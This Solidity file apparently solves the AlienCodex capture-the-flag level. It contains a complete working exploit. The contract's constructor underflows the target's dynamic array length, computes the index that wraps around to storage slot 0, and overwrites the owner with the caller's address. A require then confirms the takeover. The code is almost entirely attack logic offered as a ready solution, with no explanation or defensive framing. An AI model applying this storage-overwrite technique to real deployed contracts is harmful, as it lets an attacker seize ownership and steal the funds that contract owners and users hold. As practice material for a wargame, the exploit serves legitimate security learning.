// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Hack {
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();
        uint256 h = uint256(keccak256(abi.encode(1)));
        uint256 i;
        unchecked {
            i-=h;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner()==msg.sender, "hack failed");
    } 
}

interface IAlienCodex {
    function owner() external view returns(address);
    function makeContact() external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}
